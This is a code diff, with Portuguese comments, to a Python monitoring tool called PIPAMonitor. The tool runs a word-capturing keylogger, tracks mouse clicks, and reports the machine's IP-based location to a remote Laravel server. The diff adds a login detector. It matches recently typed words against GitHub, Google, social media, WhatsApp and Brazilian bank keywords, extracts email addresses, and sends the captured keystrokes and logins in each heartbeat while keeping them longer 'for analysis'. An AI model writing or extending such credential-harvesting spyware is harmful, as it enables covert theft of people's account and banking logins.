@@ -40,6 +40,24 @@ class PIPAMonitor:
         
         # Históricos
         self.historico_cliques = []
+        self.historico_logins = []  # NOVO: Histórico de logins detectados
+        self.ultimas_palavras = []  # Buffer para palavras consecutivas
+        self.max_palavras_buffer = 10
+        
+        # Padrões para detecção de logins
+        self.padroes_login = {
+            'github': ['github.com', 'login', 'sign in', 'username', 'password', 'git'],
+            'facebook': ['facebook.com', 'fb.com', 'email', 'phone', 'senha'],
+            'google': ['accounts.google.com', 'gmail.com', 'google account'],
+            'outlook': ['outlook.com', 'live.com', 'hotmail.com', 'microsoft account'],
+            'instagram': ['instagram.com', 'insta', 'ig'],
+            'twitter': ['twitter.com', 'x.com', 'tweet'],
+            'linkedin': ['linkedin.com', 'linkedin'],
+            'banco': ['banco', 'bank', 'bancodobrasil', 'itau', 'bradesco', 'santander', 'nubank'],
+            'email': ['email', 'e-mail', 'mail', 'correio'],
+            'whatsapp': ['web.whatsapp.com', 'whatsapp'],
+            'discord': ['discord.com', 'discordapp.com']
+        }
         
         # Controles
         self.monitorando = True
@@ -55,6 +73,58 @@ class PIPAMonitor:
         
         print(f"[PIPA] Monitor iniciado - Notebook {notebook_id}")
         print(f"[PIPA] Enviando dados para: {laravel_url}")
+
+    def detectar_possivel_login(self, palavra, aplicativo):
+        """Detecta possíveis tentativas de login"""
+        # Adiciona palavra ao buffer
+        self.ultimas_palavras.append({
+            'palavra': palavra,
+            'aplicativo': aplicativo,
+            'timestamp': datetime.now().isoformat()
+        })
+        
+        # Mantém o buffer limitado
+        if len(self.ultimas_palavras) > self.max_palavras_buffer:
+            self.ultimas_palavras.pop(0)
+        
+        # Verifica padrões de login
+        palavras_texto = ' '.join([p['palavra'] for p in self.ultimas_palavras]).lower()
+        aplicativo_lower = aplicativo.lower()
+        
+        # Verifica se há padrões de serviço
+        servico_detectado = None
+        for servico, padroes in self.padroes_login.items():
+            for padrao in padroes:
+                if padrao in palavras_texto or padrao in aplicativo_lower:
+                    servico_detectado = servico
+                    break
+            if servico_detectado:
+                break
+        
+        # Verifica padrões de email
+        email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
+        emails = re.findall(email_pattern, palavras_texto)
+        
+        # Se detectou serviço ou email, registra como possível login
+        if servico_detectado or emails:
+            login_info = {
+                'servico': servico_detectado or 'desconhecido',
+                'aplicativo': aplicativo,
+                'palavras_recentes': [p['palavra'] for p in self.ultimas_palavras],
+                'possivel_email': emails[0] if emails else None,
+                'timestamp': datetime.now().isoformat(),
+                'tipo': 'login_detectado',
+                'confianca': 'alta' if servico_detectado and emails else 'media'
+            }
+            
+            self.historico_logins.append(login_info)
+            print(f"🔐 [LOGIN DETECTADO] Serviço: {servico_detectado} | App: {aplicativo}")
+            print(f"📝 Palavras: {login_info['palavras_recentes']}")
+            if emails:
+                print(f"📧 Email detectado: {emails[0]}")
+            
+            # Limpa buffer após detecção
+            self.ultimas_palavras = []
 
     def obter_localizacao(self):
         """Tenta obter localização aproximada via IP"""
@@ -305,7 +375,7 @@ class PIPAMonitor:
             return None
 
     def processar_palavra(self, palavra):
-        """Processa palavra completa do keylogger"""
+        """Processa palavra completa do keylogger com detecção de logins"""
         if len(palavra) > 2:  # Ignora palavras muito curtas
             app_info = self.obter_aplicativo_ativo()
             aplicativo = app_info.get('nome_processo', 'Desconhecido')
@@ -318,6 +388,9 @@ class PIPAMonitor:
             
             self.historico_palavras.append(palavra_info)
             print(f"[PALAVRA] '{palavra}' em {aplicativo}")
+            
+            # NOVO: Detecção de logins
+            self.detectar_possivel_login(palavra, aplicativo)
 
     def keylogger_on_press(self, key):
         """Keylogger inteligente - captura palavras completas"""
@@ -381,7 +454,7 @@ class PIPAMonitor:
                 print(f"[MOUSE] ❌ Erro: {e}")
 
     def enviar_heartbeat(self):
-        """Envia heartbeat com localização"""
+        """Envia heartbeat com localização e logins detectados"""
         try:
             self.contador_heartbeat += 1
             
@@ -400,19 +473,25 @@ class PIPAMonitor:
                 'keylog_buffer': self.keylogger_buffer,
                 'historico_palavras': self.historico_palavras[-50:],  # Últimas 50 palavras
                 'historico_cliques': self.historico_cliques[-30:],    # Últimos 30 cliques
+                'historico_logins': self.historico_logins[-20:],      # NOVO: Últimos 20 logins detectados
                 'localizacao': self.dados_sistema.get('localizacao', {}),
                 'timestamp': datetime.now().isoformat()
             }
             
             print(f"[HEARTBEAT] ✅ #{self.contador_heartbeat} - Localização: {self.dados_sistema.get('localizacao', {}).get('cidade', 'N/A')}")
+            if self.historico_logins:
+                print(f"[HEARTBEAT] 🔐 Logins detectados: {len(self.historico_logins)}")
             
             response = self.fazer_requisicao('POST', '/notebook/heartbeat', heartbeat_data)
             
             if response and response.status_code == 200:
                 print(f"[HEARTBEAT] ✅ Dados enviados com sucesso")
-                # Limpa históricos após envio bem-sucedido
+                # Limpa históricos após envio bem-sucedido (exceto logins)
                 self.historico_palavras = []
                 self.historico_cliques = []
+                # Mantém os logins por mais tempo para análise
+                if len(self.historico_logins) > 50:
+                    self.historico_logins = self.historico_logins[-25:]
             else:
                 status = response.status_code if response else 'N/A'
                 print(f"[HEARTBEAT] ❌ Falha: {status}")
@@ -535,6 +614,7 @@ class PIPAMonitor:
             self.mouse_listener.start()
             
             print("[LISTENERS] ✅ Keylogger inteligente iniciado")
+            print("[LISTENERS] 🔐 Detector de logins ativado")
         except Exception as e:
             print(f"[LISTENERS] ❌ Erro: {e}")
         
@@ -548,6 +628,7 @@ class PIPAMonitor:
         print(f"[PIPA] ✅ Monitoramento avançado ativo")
         print(f"[PIPA] 📍 Localização: {localizacao.get('cidade', 'N/A')}, {localizacao.get('estado', 'N/A')}")
         print(f"[PIPA] 🌐 IP Público: {localizacao.get('ip_publico', 'N/A')}")
+        print(f"[PIPA] 🔐 Monitorando logins em: GitHub, Facebook, Google, Bancos, etc.")
         print(f"[PIPA] 📡 Aguardando comandos...")
         
         try:
@@ -559,7 +640,7 @@ class PIPAMonitor:
 
 if __name__ == "__main__":
     LARAVEL_URL = "http://localhost:8000"
-    NOTEBOOK_ID = "pipa-notebook-01"
+    NOTEBOOK_ID = "computador-teste"
     
     # Verifica dependências
     print("[INICIO] 🔍 Verificando dependências...")
